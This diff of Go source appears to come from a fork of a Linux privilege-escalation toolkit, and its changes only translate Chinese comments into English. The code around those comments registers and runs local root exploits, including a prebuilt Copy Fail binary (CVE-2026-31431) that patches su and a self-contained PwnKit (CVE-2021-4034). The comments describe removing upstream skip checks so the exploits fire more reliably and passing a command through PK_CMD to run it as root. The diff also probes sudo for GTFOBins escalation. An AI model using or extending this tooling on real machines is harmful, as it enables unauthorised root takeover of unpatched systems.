@@ -184,7 +184,7 @@ type Toolkit struct {
 	exploits   []Exploit
 	compiled   map[string]string
 	backupDir  string
-	pkExecuted bool // fork: pwnkit 已通过 PK_CMD 以 root 执行过命令
+	pkExecuted bool // fork: pwnkit already ran the command as root via PK_CMD
 }
 
 func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *Toolkit {
@@ -216,18 +216,20 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 		{
 			Name:     "copyfail",
 			Filename: "copyfail.c",
-			// [FORK] 使用 badsectorlabs copyfail-go 预编译二进制
-			// (vendor_bin/ 覆盖进 exploits/bin/<arch>/copyfail):
-			// 实测上游 C 版提权失败而 Go 版成功。Go 版裸跑即
-			// 打补丁 su, 与 isPageCachePwned 检测模型一致。
+			// [FORK] ships the badsectorlabs copyfail-go binary
+			// (vendored into exploits/bin/<arch>/copyfail at build time):
+			// the upstream C version was observed failing where the Go one
+			// succeeds. The Go binary patches su on a bare run, matching
+			// the isPageCachePwned detection model.
 			Description: "CVE-2026-31431: Copy Fail (copyfail-go) - AF_ALG + splice page-cache write",
 			Introduced:  "4.14",
 			FixedIn:     []string{"6.18.22", "6.19.12", "7.0"},
 			CompileCmd:  []string{"gcc", "-static", "-O2", "-s"},
 			Timeout: 120 * time.Second,
-			// [FORK] 删除上游的 algif 模块 SkipCheck: 模块内建于内核时
-			// /proc/modules 看不到 -> 误跳过(C 版很可能因此
-			// 根本没跑); Go 版对不可用的 AF_ALG 会自行快速失败。
+			// [FORK] upstream algif SkipCheck removed: built-in modules are
+			// not visible in /proc/modules, so the check wrongly skipped the
+			// exploit (the C version likely never ran at all); the Go binary
+			// fails fast on its own when AF_ALG is unavailable.
 		},
 		{
 			Name:        "dirtydecrypt",
@@ -273,9 +275,10 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			Description: "CVE-2021-4034: PwnKit - pkexec environment escape",
 			Introduced:  "2.6",
 			CompileCmd:  []string{"gcc", "-O2", "-static"},
-			// [FORK] 自包含 berdav 改版: 内嵌 pwnkit.so, 无需目标机 gcc,
-			// 删掉上游的 gcc SkipCheck (上游版即使预编译二进制已嵌入
-			// 也会因 SkipCheck 先于解包执行而被跳过)。
+			// [FORK] self-contained berdav-based rewrite: embeds pwnkit.so,
+			// no gcc needed on the target; upstream gcc SkipCheck removed
+			// (upstream skipped the exploit even though the pre-compiled
+			// binary was embedded, because SkipCheck runs before extraction).
 			SuccessCheck: func() bool { return checkExploitMarker("cve_2021_4034") },
 		},
 		{
@@ -736,9 +739,9 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 			cmd.Stdout = os.Stdout
 			cmd.Stderr = os.Stderr
 		}
-		// [FORK] 自包含 exploit(如 pwnkit)通过 PK_CMD 环境变量直接以
-		// root 执行命令, 免去后续 sudo 兜底(无 sudo 的机器也能完成
-		// -c 命令执行)。
+		// [FORK] self-contained exploits (e.g. pwnkit) run the command
+		// directly as root via the PK_CMD env var, so the later sudo
+		// fallback is not needed (-c works on boxes without sudo).
 		cmd.Env = append(os.Environ(), "PK_CMD="+tk.command)
 	} else {
 		// Interactive mode: need stdout/stderr for shell interaction
@@ -764,8 +767,9 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 			return false
 		}
 		ok := exp.SuccessCheck()
-		// [FORK] pwnkit 已借 PK_CMD 执行过命令: 记录, 供 execCommandAsRoot
-		// 跳过重复执行 (sudo 兜底在无 sudo 机器上会再跑一遍并报错)。
+		// [FORK] pwnkit already ran the command via PK_CMD: record it so
+		// execCommandAsRoot skips the duplicate run (the sudo fallback
+		// would run it again and fail on boxes without sudo).
 		if ok && exp.Name == "cve_2021_4034" && tk.command != "" {
 			tk.pkExecuted = true
 		}
@@ -982,8 +986,9 @@ func (tk *Toolkit) Run() {
 // It tries several approaches: direct exec if we are root, or via patched SUID
 // binary (page-cache exploits), or via sudo.
 func (tk *Toolkit) execCommandAsRoot(exp Exploit) {
-	// [FORK] pwnkit 已通过 PK_CMD 以 root 执行过命令, 不再重复执行
-	// (重复执行无 sudo 机器上会走 sudo 兜底报错, 且命令链二次运行)。
+	// [FORK] pwnkit already executed the command as root via PK_CMD;
+	// skip the duplicate run (the sudo fallback would fail without sudo
+	// and the command chain would run twice).
 	if tk.pkExecuted && exp.Name == "cve_2021_4034" {
 		tk.say("[+] %s already executed the command as root via PK_CMD", exp.Name)
 		return
@@ -1324,8 +1329,9 @@ func handleGTFOBins(tk *Toolkit) bool {
 	}
 
 	cmd := exec.Command(sudoPath, "-n", "-l")
-	// [FORK] 无 sudo 机器上 sudo 自身的 "a password is required" 会直接
-	// 打到终端(Stderr 未接), -q 模式下吞掉噪声。
+	// [FORK] on boxes without sudo, sudo itself prints "a password is
+	// required" straight to the terminal (stderr unset); swallow the noise
+	// in quiet mode.
 	if tk.quiet {
 		cmd.Stderr = nil
 	}
